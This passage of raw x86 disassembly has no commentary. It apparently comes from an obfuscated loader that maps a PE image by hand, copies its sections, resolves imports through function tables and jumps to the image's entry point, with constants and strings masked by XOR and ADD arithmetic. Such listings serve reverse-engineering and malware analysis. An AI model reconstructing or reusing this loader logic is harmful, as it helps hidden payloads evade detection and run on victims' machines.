  41ee1b:	mov    eax,DWORD PTR [eax+0x38]
  41ee1e:	lea    ecx,[eax-0x1]
  41ee21:	mov    DWORD PTR [ebp-0x34],eax
  41ee24:	mov    eax,DWORD PTR [edx]
  41ee26:	test   ecx,eax
  41ee28:	je     0x41ee31
  41ee2a:	not    ecx
  41ee2c:	and    eax,ecx
  41ee2e:	add    eax,DWORD PTR [ebp-0x34]
  41ee31:	mov    ecx,DWORD PTR [edx+0x4]
  41ee34:	add    ecx,DWORD PTR [ebp+0x20]
  41ee37:	push   ecx
  41ee38:	call   0x41f72c
  41ee3d:	mov    edx,DWORD PTR [ebp-0x4]
  41ee40:	mov    eax,DWORD PTR [ebp+0x18]
  41ee43:	mov    ecx,DWORD PTR [eax+0x8]
  41ee46:	xor    edx,esi
  41ee48:	add    edx,edi
  41ee4a:	cmp    ecx,edx
  41ee4c:	je     0x41ee65
  41ee4e:	push   ecx
  41ee4f:	mov    ecx,DWORD PTR [ebp+0x8]
  41ee52:	add    ecx,DWORD PTR [eax+0xc]
  41ee55:	mov    eax,DWORD PTR [eax+0x4]
  41ee58:	add    eax,DWORD PTR [ebp+0x20]
  41ee5b:	push   ecx
  41ee5c:	push   eax
  41ee5d:	call   0x41f5d3
  41ee62:	mov    eax,DWORD PTR [ebp+0x18]
  41ee65:	mov    ecx,DWORD PTR [ebp-0x24]
  41ee68:	mov    edx,DWORD PTR [ebp-0x8]
  41ee6b:	add    eax,0x28
  41ee6e:	xor    ecx,esi
  41ee70:	lea    ecx,[edx+ecx*1+0x3272e2]
  41ee77:	mov    edx,DWORD PTR [ebp+0xc]
  41ee7a:	mov    DWORD PTR [ebp+0x18],eax
  41ee7d:	mov    eax,DWORD PTR [ebp-0x24]
  41ee80:	movzx  edx,WORD PTR [edx+0x6]
  41ee84:	xor    eax,esi
  41ee86:	sub    edx,eax
  41ee88:	mov    eax,DWORD PTR [ebp+0xc]
  41ee8b:	sub    edx,edi
  41ee8d:	mov    DWORD PTR [ebp-0x8],ecx
  41ee90:	cmp    ecx,edx
  41ee92:	jbe    0x41ee18
  41ee94:	mov    edx,DWORD PTR [ebx+0x18c]
  41ee9a:	mov    ecx,DWORD PTR [ebp+0x20]
  41ee9d:	cmp    ecx,DWORD PTR [edx]
  41ee9f:	jne    0x41eec8
  41eea1:	mov    eax,DWORD PTR [ebx+0x1d8]
  41eea7:	lea    edx,[ebp-0x1c]
  41eeaa:	push   edx
  41eeab:	mov    edx,DWORD PTR [ebp-0x10]
  41eeae:	xor    edx,esi
  41eeb0:	add    edx,edi
  41eeb2:	push   edx
  41eeb3:	mov    edx,DWORD PTR [ebp-0x18]
  41eeb6:	push   DWORD PTR [edx+0x54]
  41eeb9:	push   ecx
  41eeba:	call   DWORD PTR [eax+0x1c]
  41eebd:	test   eax,eax
  41eebf:	je     0x41f131
  41eec5:	mov    eax,DWORD PTR [ebp+0xc]
  41eec8:	mov    ecx,DWORD PTR [ebx+0x1c8]
  41eece:	mov    ecx,DWORD PTR [ecx]
  41eed0:	xor    ecx,esi
  41eed2:	add    ecx,edi
  41eed4:	je     0x41f05c
  41eeda:	and    DWORD PTR [ebp-0x28],0x0
  41eede:	and    DWORD PTR [ebp+0x8],0x0
  41eee2:	mov    eax,0xf89c8519
  41eee7:	lea    ecx,[eax-0x8]
  41eeea:	mov    DWORD PTR [ebp-0x4c],0xf89c8517
  41eef1:	mov    DWORD PTR [ebp-0x48],0xf89c8509
  41eef8:	mov    DWORD PTR [ebp-0x44],eax
  41eefb:	mov    DWORD PTR [ebp-0x40],ecx
  41eefe:	mov    DWORD PTR [ebp-0x3c],ecx
  41ef01:	mov    DWORD PTR [ebp-0x38],0xf89c8585
  41ef08:	mov    edx,DWORD PTR [ebp+0x8]
  41ef0b:	mov    ecx,0x89b
  41ef10:	xor    cx,WORD PTR [ebp+edx*4-0x4c]
  41ef15:	mov    edx,0x72e2
  41ef1a:	add    cx,dx
  41ef1d:	mov    edx,DWORD PTR [ebp+0x8]
  41ef20:	inc    DWORD PTR [ebp+0x8]
  41ef23:	cmp    DWORD PTR [ebp+0x8],0x6
  41ef27:	mov    WORD PTR [ebp+edx*2-0xb4],cx
  41ef2f:	jb     0x41ef08
  41ef31:	mov    ecx,0xf89c850b
  41ef36:	mov    DWORD PTR [ebp-0xa4],eax
  41ef3c:	mov    DWORD PTR [ebp-0x90],eax
  41ef42:	mov    DWORD PTR [ebp-0x68],eax
  41ef45:	mov    DWORD PTR [ebp-0x64],eax
  41ef48:	lea    eax,[ecx-0x1]
  41ef4b:	mov    edx,0xf89c85ff
  41ef50:	mov    DWORD PTR [ebp-0x58],eax
  41ef53:	mov    DWORD PTR [ebp-0x54],eax
  41ef56:	mov    DWORD PTR [ebp-0xa8],0xf89c85f1
  41ef60:	mov    DWORD PTR [ebp-0xa0],ecx
  41ef66:	mov    DWORD PTR [ebp-0x9c],edx
  41ef6c:	mov    DWORD PTR [ebp-0x98],0xf89c851c
  41ef76:	mov    DWORD PTR [ebp-0x94],0xf89c8517
  41ef80:	mov    DWORD PTR [ebp-0x8c],0xf89c85f8
  41ef8a:	mov    DWORD PTR [ebp-0x88],0xf89c8517
  41ef94:	mov    DWORD PTR [ebp-0x84],0xf89c8509
  41ef9e:	mov    DWORD PTR [ebp-0x80],ecx
  41efa1:	mov    DWORD PTR [ebp-0x7c],0xf89c850c
  41efa8:	mov    DWORD PTR [ebp-0x78],edx
  41efab:	mov    DWORD PTR [ebp-0x74],0xf89c8516
  41efb2:	mov    DWORD PTR [ebp-0x70],ecx
  41efb5:	mov    DWORD PTR [ebp-0x6c],0xf89c85c4
  41efbc:	mov    DWORD PTR [ebp-0x60],ecx
  41efbf:	mov    DWORD PTR [ebp-0x5c],0xf89c8518
  41efc6:	mov    DWORD PTR [ebp-0x50],0xf89c8585
  41efcd:	xor    eax,eax
  41efcf:	mov    cl,BYTE PTR [ebp+eax*4-0xa8]
  41efd6:	xor    cl,0x9b
  41efd9:	sub    cl,0x1e
  41efdc:	mov    BYTE PTR [ebp+eax*1-0xcc],cl
  41efe3:	inc    eax
  41efe4:	cmp    eax,0x17
  41efe7:	jb     0x41efcf
  41efe9:	mov    eax,DWORD PTR [ebx+0x1d8]
  41efef:	lea    ecx,[ebp-0xb4]
  41eff5:	push   ecx
  41eff6:	call   DWORD PTR [eax+0x4]
  41eff9:	mov    ecx,DWORD PTR [ebx+0x1d8]
  41efff:	lea    edx,[ebp-0xcc]
  41f005:	push   edx
  41f006:	push   eax
  41f007:	call   DWORD PTR [ecx+0x8]
  41f00a:	lea    ecx,[ebp-0x28]
  41f00d:	push   ecx
  41f00e:	mov    ecx,DWORD PTR [ebx+0x18c]
  41f014:	push   DWORD PTR [ecx]
  41f016:	call   eax
  41f018:	mov    eax,DWORD PTR [ebp-0x28]
  41f01b:	test   eax,eax
  41f01d:	je     0x41f059
  41f01f:	mov    DWORD PTR [ebp+0x8],eax
  41f022:	jmp    0x41f02e
  41f024:	mov    eax,DWORD PTR [eax]
  41f026:	mov    DWORD PTR [ebp-0x28],eax
  41f029:	cmp    eax,DWORD PTR [ebp+0x8]
  41f02c:	je     0x41f03b
  41f02e:	mov    edx,DWORD PTR [eax+0x18]
  41f031:	mov    ecx,DWORD PTR [ebx+0x18c]
  41f037:	cmp    edx,DWORD PTR [ecx]
  41f039:	jne    0x41f024
  41f03b:	mov    edx,DWORD PTR [eax+0x18]
  41f03e:	mov    ecx,DWORD PTR [ebx+0x18c]
  41f044:	cmp    edx,DWORD PTR [ecx]
  41f046:	jne    0x41f059
  41f048:	mov    edx,DWORD PTR [ebp-0x18]
  41f04b:	mov    ecx,DWORD PTR [ebx+0x190]
  41f051:	mov    edx,DWORD PTR [edx+0x28]
  41f054:	add    edx,DWORD PTR [ecx]
  41f056:	mov    DWORD PTR [eax+0x1c],edx
  41f059:	mov    eax,DWORD PTR [ebp+0xc]
  41f05c:	push   ebx
  41f05d:	push   eax
  41f05e:	push   DWORD PTR [ebp+0x20]
  41f061:	call   0x41e80b
  41f066:	test   eax,eax
  41f068:	je     0x41f131
  41f06e:	push   DWORD PTR [ebp+0xc]
  41f071:	mov    ecx,ebx
  41f073:	push   DWORD PTR [ebp+0x20]
  41f076:	call   0x41e764
  41f07b:	test   eax,eax
  41f07d:	je     0x41f131
  41f083:	mov    eax,DWORD PTR [ebp+0xc]
  41f086:	mov    edx,DWORD PTR [ebp+0x20]
  41f089:	mov    ecx,ebx
  41f08b:	call   0x41e63d
  41f090:	test   eax,eax
  41f092:	je     0x41f131
  41f098:	push   ebx
  41f099:	push   DWORD PTR [ebp+0x20]
  41f09c:	call   0x41eaee
  41f0a1:	test   eax,eax
  41f0a3:	je     0x41f131
  41f0a9:	mov    eax,DWORD PTR [ebx+0x18c]
  41f0af:	mov    edx,DWORD PTR [ebp+0x20]
  41f0b2:	cmp    edx,DWORD PTR [eax]
  41f0b4:	jne    0x41f0d0
  41f0b6:	mov    eax,DWORD PTR [ebx+0x1d8]
  41f0bc:	lea    ecx,[ebp-0x1c]
  41f0bf:	push   ecx
  41f0c0:	push   DWORD PTR [ebp-0x1c]
  41f0c3:	mov    ecx,DWORD PTR [ebp-0x18]
  41f0c6:	push   DWORD PTR [ecx+0x54]
  41f0c9:	push   edx
  41f0ca:	call   DWORD PTR [eax+0x1c]
  41f0cd:	mov    edx,DWORD PTR [ebp+0x20]
  41f0d0:	mov    eax,DWORD PTR [ebx+0x1c8]
  41f0d6:	mov    eax,DWORD PTR [eax]
  41f0d8:	xor    eax,esi
  41f0da:	add    eax,edi
  41f0dc:	je     0x41f115
  41f0de:	mov    ecx,DWORD PTR [ebp+0xc]
  41f0e1:	mov    eax,DWORD PTR [ecx+0x28]
  41f0e4:	mov    DWORD PTR [ebp+0x8],0xf89ca585
  41f0eb:	mov    esi,DWORD PTR [ebp+0x8]
  41f0ee:	push   DWORD PTR [ebp+0x14]
  41f0f1:	xor    esi,0x89b
  41f0f7:	push   DWORD PTR [ebp+0x10]
  41f0fa:	add    esi,0x72e2
  41f100:	or     WORD PTR [ecx+0x16],si
  41f104:	add    eax,edx
  41f106:	push   edx
  41f107:	call   eax
  41f109:	mov    DWORD PTR [ebx+0x1d0],0xf89c8584
  41f113:	jmp    0x41f11f
  41f115:	mov    eax,DWORD PTR [ebp+0xc]
  41f118:	mov    eax,DWORD PTR [eax+0x28]
  41f11b:	add    eax,edx
  41f11d:	call   eax
  41f11f:	mov    DWORD PTR [ebp-0x8],eax
  41f122:	mov    eax,DWORD PTR [ebp-0x8]
  41f125:	mov    ecx,DWORD PTR [ebp+0x1c]
  41f128:	mov    DWORD PTR [ecx],eax
  41f12a:	mov    DWORD PTR [ebp-0x30],0x1
  41f131:	cmp    DWORD PTR [ebp-0x30],0x0
  41f135:	jne    0x41f13b
  41f137:	and    DWORD PTR [ebp+0x20],0x0
  41f13b:	mov    eax,DWORD PTR [ebp+0x20]
  41f13e:	jmp    0x41f142
  41f140:	xor    eax,eax
  41f142:	pop    edi
  41f143:	pop    esi
  41f144:	pop    ebx
  41f145:	leave  
  41f146:	ret    0x1c
  41f149:	push   ebp
  41f14a:	mov    ebp,esp
  41f14c:	movzx  edx,WORD PTR [ecx+0x6]
  41f150:	movzx  eax,WORD PTR [ecx+0x14]
  41f154:	push   ebx
  41f155:	push   edi
  41f156:	xor    edi,edi
  41f158:	lea    eax,[eax+ecx*1+0x18]
  41f15c:	test   edx,edx
  41f15e:	je     0x41f17f
  41f160:	mov    ecx,DWORD PTR [eax+0xc]
  41f163:	lea    ebx,[ecx+esi*1]
  41f166:	cmp    DWORD PTR [ebp+0x8],ebx
  41f169:	jb     0x41f177
  41f16b:	mov    ebx,DWORD PTR [eax+0x8]
  41f16e:	add    ebx,ecx
  41f170:	add    ebx,esi
  41f172:	cmp    DWORD PTR [ebp+0x8],ebx
  41f175:	jb     0x41f181
  41f177:	add    eax,0x28
  41f17a:	inc    edi
  41f17b:	cmp    edi,edx
  41f17d:	jb     0x41f160
  41f17f:	xor    eax,eax
  41f181:	pop    edi
  41f182:	pop    ebx
  41f183:	pop    ebp
  41f184:	ret    0x4
  41f187:	push   ebp
  41f188:	mov    ebp,esp
  41f18a:	sub    esp,0x34
  41f18d:	mov    DWORD PTR [ebp-0xc],0xf89c8585
  41f194:	mov    DWORD PTR [ebp-0x18],0xf89c8584
  41f19b:	mov    DWORD PTR [ebp-0x1c],0xf89c85bb
  41f1a2:	mov    DWORD PTR [ebp-0x8],0xf89c85e4
  41f1a9:	mov    DWORD PTR [ebp-0x20],0xf89c85c4
  41f1b0:	mov    DWORD PTR [ebp-0x2c],0xf89c8503
  41f1b7:	mov    DWORD PTR [ebp-0x2c],0xf89c85e3
  41f1be:	mov    DWORD PTR [ebp-0x10],eax
  41f1c1:	mov    eax,DWORD PTR [ebp+0x8]
  41f1c4:	mov    DWORD PTR [ebp-0x14],eax
  41f1c7:	mov    eax,DWORD PTR [ebp-0xc]
  41f1ca:	push   ebx
  41f1cb:	mov    ecx,0x751089b
  41f1d0:	xor    eax,ecx
  41f1d2:	push   esi
  41f1d3:	mov    esi,DWORD PTR [ebp-0x10]
  41f1d6:	mov    edx,0x3272e2
  41f1db:	add    eax,edx
  41f1dd:	push   edi
  41f1de:	cmp    esi,eax
  41f1e0:	je     0x41f3bf
  41f1e6:	mov    eax,DWORD PTR [ebp-0xc]
  41f1e9:	mov    esi,DWORD PTR [ebp-0x14]
  41f1ec:	xor    eax,ecx
  41f1ee:	add    eax,edx
  41f1f0:	cmp    esi,eax
  41f1f2:	je     0x41f3bf
  41f1f8:	mov    eax,DWORD PTR [ebp-0xc]
  41f1fb:	xor    eax,ecx
  41f1fd:	add    eax,edx
  41f1ff:	mov    DWORD PTR [ebp-0x24],eax
  41f202:	mov    eax,DWORD PTR [ebp-0xc]
  41f205:	xor    eax,ecx
  41f207:	add    eax,edx
  41f209:	mov    DWORD PTR [ebp-0x28],eax
  41f20c:	mov    edi,DWORD PTR [ebp-0x20]
  41f20f:	mov    ebx,DWORD PTR [ebp-0x8]
  41f212:	mov    esi,0x89b
  41f217:	xor    edi,esi
  41f219:	mov    eax,0x72e2
  41f21e:	xor    ebx,esi
  41f220:	add    edi,eax
  41f222:	add    ebx,eax
  41f224:	sub    ebx,edi
  41f226:	mov    WORD PTR [ebp-0x8],bx
  41f22a:	jmp    0x41f2ef
  41f22f:	mov    edi,DWORD PTR [ebp-0xc]
  41f232:	mov    bx,WORD PTR [ebp-0x4]
  41f236:	xor    edi,esi
  41f238:	add    edi,eax
  41f23a:	cmp    bx,di
  41f23d:	je     0x41f331
  41f243:	mov    edi,DWORD PTR [ebp-0xc]
  41f246:	mov    ebx,DWORD PTR [ebp+0xc]
  41f249:	xor    edi,ecx
  41f24b:	add    edi,edx
  41f24d:	cmp    ebx,edi
  41f24f:	mov    di,WORD PTR [ebp-0x4]
  41f253:	mov    bx,WORD PTR [ebp+0x8]
  41f257:	je     0x41f2c2
  41f259:	cmp    bx,di
  41f25c:	je     0x41f2cb
  41f25e:	mov    edi,DWORD PTR [ebp-0x20]
  41f261:	mov    bx,WORD PTR [ebp+0x8]
  41f265:	xor    edi,esi
  41f267:	add    edi,eax
  41f269:	cmp    bx,di
  41f26c:	jb     0x41f28c
  41f26e:	mov    edi,DWORD PTR [ebp-0x2c]
  41f271:	mov    bx,WORD PTR [ebp+0x8]
  41f275:	xor    edi,esi
  41f277:	add    edi,eax
  41f279:	cmp    bx,di
  41f27c:	ja     0x41f28c
  41f27e:	movzx  edi,WORD PTR [ebp+0x8]
  41f282:	movzx  ebx,WORD PTR [ebp-0x8]
  41f286:	add    edi,ebx
  41f288:	mov    WORD PTR [ebp+0x8],di
  41f28c:	mov    edi,DWORD PTR [ebp-0x20]
  41f28f:	mov    bx,WORD PTR [ebp-0x4]
  41f293:	xor    edi,esi
  41f295:	add    edi,eax
  41f297:	cmp    bx,di
  41f29a:	jb     0x41f2ba
  41f29c:	mov    edi,DWORD PTR [ebp-0x2c]
  41f29f:	mov    bx,WORD PTR [ebp-0x4]
  41f2a3:	xor    edi,esi
  41f2a5:	add    edi,eax
  41f2a7:	cmp    bx,di
  41f2aa:	ja     0x41f2ba
  41f2ac:	movzx  edi,WORD PTR [ebp-0x4]
  41f2b0:	movzx  ebx,WORD PTR [ebp-0x8]
  41f2b4:	add    edi,ebx
  41f2b6:	mov    WORD PTR [ebp-0x4],di
  41f2ba:	mov    di,WORD PTR [ebp-0x4]
  41f2be:	mov    bx,WORD PTR [ebp+0x8]
  41f2c2:	cmp    bx,di
  41f2c5:	jne    0x41f3bf
  41f2cb:	mov    edi,DWORD PTR [ebp-0x1c]
  41f2ce:	mov    ebx,DWORD PTR [ebp-0x10]
  41f2d1:	xor    edi,ecx
  41f2d3:	lea    edi,[edi+ebx*1+0x3272e2]
  41f2da:	mov    DWORD PTR [ebp-0x10],edi
  41f2dd:	mov    edi,DWORD PTR [ebp-0x1c]
  41f2e0:	mov    ebx,DWORD PTR [ebp-0x14]
  41f2e3:	xor    edi,ecx
  41f2e5:	lea    edi,[edi+ebx*1+0x3272e2]
  41f2ec:	mov    DWORD PTR [ebp-0x14],edi
  41f2ef:	mov    edi,DWORD PTR [ebp-0x24]
  41f2f2:	mov    ebx,DWORD PTR [ebp-0x10]
  41f2f5:	mov    di,WORD PTR [ebx+edi*2]
  41f2f9:	mov    WORD PTR [ebp+0x8],di
  41f2fd:	mov    edi,DWORD PTR [ebp-0x28]
  41f300:	mov    ebx,DWORD PTR [ebp-0x14]
  41f303:	mov    di,WORD PTR [ebx+edi*2]
  41f307:	mov    WORD PTR [ebp-0x4],di
  41f30b:	mov    edi,DWORD PTR [ebp-0xc]
  41f30e:	mov    bx,WORD PTR [ebp+0x8]
  41f312:	xor    edi,esi
  41f314:	add    edi,eax
  41f316:	cmp    bx,di
  41f319:	jne    0x41f22f
  41f31f:	mov    eax,DWORD PTR [ebp-0x18]
  41f322:	mov    esi,DWORD PTR [ebp-0xc]
  41f325:	xor    eax,ecx
  41f327:	add    eax,edx
  41f329:	imul   eax,esi
  41f32c:	mov    DWORD PTR [ebp-0xc],eax
  41f32f:	jmp    0x41f343
  41f331:	mov    eax,DWORD PTR [ebp-0xc]
  41f334:	mov    esi,DWORD PTR [ebp-0x18]
  41f337:	xor    eax,ecx
  41f339:	lea    eax,[eax+esi*1+0x3272e2]
  41f340:	mov    DWORD PTR [ebp-0x18],eax
  41f343:	mov    eax,DWORD PTR [ebp-0x24]
  41f346:	sub    eax,edx
  41f348:	xor    eax,ecx
  41f34a:	mov    DWORD PTR [ebp-0x30],eax
  41f34d:	mov    eax,DWORD PTR [ebp-0x28]
  41f350:	sub    eax,edx
  41f352:	xor    eax,ecx
  41f354:	mov    DWORD PTR [ebp-0x34],eax
  41f357:	mov    eax,DWORD PTR [ebp-0x34]
  41f35a:	mov    esi,DWORD PTR [ebp-0x1c]
  41f35d:	xor    esi,ecx
  41f35f:	add    esi,edx
  41f361:	xor    eax,ecx
  41f363:	add    eax,0x3272e2
  41f368:	imul   esi,eax
  41f36b:	mov    eax,DWORD PTR [ebp-0x14]
  41f36e:	movzx  eax,WORD PTR [esi+eax*1]
  41f372:	mov    esi,DWORD PTR [ebp-0x30]
  41f375:	mov    edi,DWORD PTR [ebp-0x1c]
  41f378:	xor    esi,ecx
  41f37a:	add    esi,edx
  41f37c:	xor    edi,ecx
  41f37e:	add    edi,edx
  41f380:	imul   edi,esi
  41f383:	mov    esi,DWORD PTR [ebp-0x10]
  41f386:	movzx  esi,WORD PTR [edi+esi*1]
  41f38a:	sub    eax,edx
  41f38c:	sub    esi,edx
  41f38e:	xor    eax,ecx
  41f390:	xor    esi,ecx
  41f392:	cmp    esi,eax
  41f394:	jne    0x41f3bf
  41f396:	mov    eax,DWORD PTR [ebp-0x30]
  41f399:	mov    esi,DWORD PTR [ebp-0x1c]
  41f39c:	xor    eax,ecx
  41f39e:	add    eax,0x3272e2
  41f3a3:	xor    esi,ecx
  41f3a5:	add    esi,edx
  41f3a7:	imul   esi,eax
  41f3aa:	mov    eax,DWORD PTR [ebp-0x10]
  41f3ad:	movzx  eax,WORD PTR [esi+eax*1]
  41f3b1:	mov    esi,DWORD PTR [ebp-0xc]
  41f3b4:	sub    eax,edx
  41f3b6:	xor    eax,ecx
  41f3b8:	cmp    eax,esi
  41f3ba:	mov    eax,DWORD PTR [ebp-0xc]
  41f3bd:	je     0x41f3c2
  41f3bf:	mov    eax,DWORD PTR [ebp-0x18]
  41f3c2:	pop    edi
  41f3c3:	xor    eax,ecx
  41f3c5:	pop    esi
  41f3c6:	add    eax,edx
  41f3c8:	pop    ebx
  41f3c9:	leave  
  41f3ca:	ret    0x8
  41f3cd:	push   ebp
  41f3ce:	mov    ebp,esp
  41f3d0:	push   ecx
  41f3d1:	mov    cx,WORD PTR [eax]
  41f3d4:	push   esi
  41f3d5:	mov    esi,0x3b51
  41f3da:	sub    cx,si
  41f3dd:	mov    esi,0x8a8d
  41f3e2:	xor    cx,si
  41f3e5:	mov    esi,0x4e22
  41f3ea:	mov    DWORD PTR [ebp-0x4],0xf89c8586
  41f3f1:	mov    edx,0xf89c8585
  41f3f6:	cmp    cx,si
  41f3f9:	je     0x41f458
  41f3fb:	push   ebx
  41f3fc:	push   edi
  41f3fd:	movzx  ecx,cx
  41f400:	mov    edi,0xffcd8d1e
  41f405:	mov    esi,0x751089b
  41f40a:	mov    ebx,0x4f86
  41f40f:	cmp    cx,bx
  41f412:	jne    0x41f417
  41f414:	mov    DWORD PTR [ebp-0x4],edx
  41f417:	lea    edx,[edi+0x1]
  41f41a:	xor    edx,esi
  41f41c:	mov    edi,edx
  41f41e:	xor    edi,esi
  41f420:	mov    cx,WORD PTR [eax+edi*2+0x64e5c4]
  41f428:	mov    ebx,0x3b51
  41f42d:	sub    cx,bx
  41f430:	mov    ebx,0x8a8d
  41f435:	xor    cx,bx
  41f438:	mov    ebx,0x4e22
  41f43d:	cmp    cx,bx
  41f440:	jne    0x41f40a
  41f442:	mov    ecx,DWORD PTR [ebp-0x4]
  41f445:	pop    edi
  41f446:	pop    ebx
  41f447:	cmp    ecx,0xf89c8586
  41f44d:	je     0x41f458
  41f44f:	xor    ecx,esi
  41f451:	lea    eax,[eax+ecx*2+0x64e5c6]
  41f458:	pop    esi
  41f459:	leave  
  41f45a:	ret    
  41f45b:	push   ebp
  41f45c:	mov    ebp,esp
  41f45e:	push   ecx
  41f45f:	push   esi
  41f460:	push   edi
  41f461:	mov    DWORD PTR [ebp-0x4],0xf89c8586
  41f468:	mov    esi,0xf89c8585
  41f46d:	call   0x41f3cd
  41f472:	mov    edi,eax
  41f474:	mov    al,BYTE PTR [edi]
  41f476:	add    al,0x8
  41f478:	xor    al,0x74
  41f47a:	cmp    al,0x7c
  41f47c:	je     0x41f4df
  41f47e:	mov    eax,edi
  41f480:	mov    edx,0xffcd8d1e
  41f485:	mov    ecx,0x751089b
  41f48a:	push   ebx
  41f48b:	mov    ax,WORD PTR [eax]
  41f48e:	mov    ebx,0x3b51
  41f493:	sub    ax,bx
  41f496:	mov    ebx,0x8a8d
  41f49b:	xor    ax,bx
  41f49e:	mov    ebx,0x4e50
  41f4a3:	cmp    ax,bx
  41f4a6:	jne    0x41f4ab
  41f4a8:	mov    DWORD PTR [ebp-0x4],esi
  41f4ab:	lea    esi,[edx+0x1]
  41f4ae:	xor    esi,ecx
  41f4b0:	mov    edx,esi
  41f4b2:	xor    edx,ecx
  41f4b4:	lea    eax,[edi+edx*2+0x64e5c4]
  41f4bb:	mov    bl,BYTE PTR [eax]
  41f4bd:	add    bl,0x8
  41f4c0:	xor    bl,0x74
  41f4c3:	cmp    bl,0x7c
  41f4c6:	jne    0x41f48b
  41f4c8:	mov    eax,DWORD PTR [ebp-0x4]
  41f4cb:	pop    ebx
  41f4cc:	cmp    eax,0xf89c8586
  41f4d1:	je     0x41f4df
  41f4d3:	xor    eax,ecx
  41f4d5:	xor    ecx,ecx
  41f4d7:	mov    WORD PTR [edi+eax*2+0x64e5c4],cx
  41f4df:	mov    eax,edi
  41f4e1:	pop    edi
  41f4e2:	pop    esi
  41f4e3:	leave  
  41f4e4:	ret    
  41f4e5:	push   ebp
  41f4e6:	mov    ebp,esp
  41f4e8:	push   ecx
  41f4e9:	push   esi
  41f4ea:	mov    DWORD PTR [ebp-0x4],0xf89c8586
  41f4f1:	mov    esi,0xf89c8585
  41f4f6:	call   0x41f3cd
  41f4fb:	mov    cx,WORD PTR [eax]
  41f4fe:	mov    edx,0x3b51
  41f503:	sub    cx,dx
  41f506:	mov    edx,0x8a8d
  41f50b:	xor    cx,dx
  41f50e:	mov    edx,0x4e22
  41f513:	cmp    cx,dx
  41f516:	je     0x41f56f
  41f518:	push   ebx
  41f519:	push   edi
  41f51a:	movzx  ecx,cx
  41f51d:	mov    edx,0xffcd8d1e
  41f522:	mov    edi,0x751089b
  41f527:	mov    ebx,0x4e50
  41f52c:	cmp    cx,bx
  41f52f:	jne    0x41f534
  41f531:	mov    DWORD PTR [ebp-0x4],esi
  41f534:	lea    esi,[edx+0x1]
  41f537:	xor    esi,edi
  41f539:	mov    edx,esi
  41f53b:	xor    edx,edi
  41f53d:	mov    cx,WORD PTR [eax+edx*2+0x64e5c4]
  41f545:	mov    ebx,0x3b51
  41f54a:	sub    cx,bx
  41f54d:	mov    ebx,0x8a8d
  41f552:	xor    cx,bx
  41f555:	mov    ebx,0x4e22
  41f55a:	cmp    cx,bx
  41f55d:	jne    0x41f527
  41f55f:	cmp    DWORD PTR [ebp-0x4],0xf89c8586
  41f566:	pop    edi
  41f567:	pop    ebx
  41f568:	je     0x41f56f
  41f56a:	xor    eax,eax
  41f56c:	inc    eax
  41f56d:	jmp    0x41f571
  41f56f:	xor    eax,eax
  41f571:	pop    esi
  41f572:	leave  
  41f573:	ret    
  41f574:	push   ebp
  41f575:	mov    ebp,esp
  41f577:	push   ecx
  41f578:	mov    eax,DWORD PTR [ebp+0x8]
  41f57b:	movzx  ecx,WORD PTR [eax]
  41f57e:	push   esi
  41f57f:	lea    eax,[ecx-0x3b51]
  41f585:	mov    esi,0x8a8d
  41f58a:	push   edi
  41f58b:	xor    eax,esi
  41f58d:	mov    edi,0x4e22
  41f592:	mov    DWORD PTR [ebp-0x4],edx
  41f595:	cmp    ax,di
  41f598:	je     0x41f5c5
  41f59a:	mov    eax,DWORD PTR [ebp+0x8]
  41f59d:	sub    eax,edx
  41f59f:	mov    DWORD PTR [ebp+0x8],eax
  41f5a2:	jmp    0x41f5a7
  41f5a4:	mov    eax,DWORD PTR [ebp+0x8]
  41f5a7:	mov    WORD PTR [edx],cx
  41f5aa:	add    edx,0x2
  41f5ad:	movzx  edi,WORD PTR [eax+edx*1]
  41f5b1:	mov    ecx,edi
  41f5b3:	add    edi,0xffffc4af
  41f5b9:	xor    edi,esi
  41f5bb:	mov    eax,0x4e22
  41f5c0:	cmp    di,ax
  41f5c3:	jne    0x41f5a4
  41f5c5:	xor    eax,eax
  41f5c7:	pop    edi
  41f5c8:	mov    WORD PTR [edx],ax
  41f5cb:	mov    eax,DWORD PTR [ebp-0x4]
  41f5ce:	pop    esi
  41f5cf:	leave  
  41f5d0:	ret    0x4
  41f5d3:	push   ebp
  41f5d4:	mov    ebp,esp
  41f5d6:	sub    esp,0x18
  41f5d9:	mov    DWORD PTR [ebp-0x14],0xf89c8585
  41f5e0:	mov    DWORD PTR [ebp-0x18],0xf89c8584
  41f5e7:	mov    eax,DWORD PTR [ebp-0x14]
  41f5ea:	xor    eax,0x751089b
  41f5ef:	add    eax,0x3272e2
  41f5f4:	mov    DWORD PTR [ebp-0x8],eax
  41f5f7:	mov    DWORD PTR [ebp-0x10],0xf89c85bd
  41f5fe:	mov    DWORD PTR [ebp-0xc],0xf89c85b9
  41f605:	mov    DWORD PTR [ebp-0x4],0xf89c85bb
  41f60c:	mov    eax,DWORD PTR [ebp-0x14]
  41f60f:	xor    eax,0x751089b
  41f614:	mov    ecx,DWORD PTR [ebp-0x8]
  41f617:	lea    eax,[ecx+eax*1+0x3272e2]
  41f61e:	mov    ecx,DWORD PTR [ebp-0x18]
  41f621:	xor    ecx,0x751089b
  41f627:	add    ecx,0x3272e2
  41f62d:	mov    edx,DWORD PTR [ebp+0x10]
  41f630:	imul   edx,ecx
  41f633:	cmp    eax,edx
  41f635:	jae    0x41f728
  41f63b:	mov    eax,DWORD PTR [ebp+0x10]
  41f63e:	mov    ecx,DWORD PTR [ebp-0x8]
  41f641:	sub    eax,ecx
  41f643:	mov    ecx,DWORD PTR [ebp-0x10]
  41f646:	xor    ecx,0x751089b
  41f64c:	add    ecx,0x3272e2
  41f652:	cmp    eax,ecx
  41f654:	jbe    0x41f686
  41f656:	mov    eax,DWORD PTR [ebp+0x8]
  41f659:	add    eax,DWORD PTR [ebp-0x8]
  41f65c:	mov    ecx,DWORD PTR [ebp+0xc]
  41f65f:	add    ecx,DWORD PTR [ebp-0x8]
  41f662:	mov    edx,DWORD PTR [ecx]
  41f664:	mov    DWORD PTR [eax],edx
  41f666:	mov    ecx,DWORD PTR [ecx+0x4]
  41f669:	mov    DWORD PTR [eax+0x4],ecx
  41f66c:	mov    eax,DWORD PTR [ebp-0x10]
  41f66f:	xor    eax,0x751089b
  41f674:	mov    ecx,DWORD PTR [ebp-0x8]
  41f677:	lea    eax,[ecx+eax*1+0x3272e2]
  41f67e:	mov    DWORD PTR [ebp-0x8],eax
  41f681:	jmp    0x41f723
  41f686:	mov    eax,DWORD PTR [ebp+0x10]
  41f689:	mov    ecx,DWORD PTR [ebp-0x8]
  41f68c:	sub    eax,ecx
  41f68e:	mov    ecx,DWORD PTR [ebp-0xc]
  41f691:	xor    ecx,0x751089b
  41f697:	add    ecx,0x3272e2
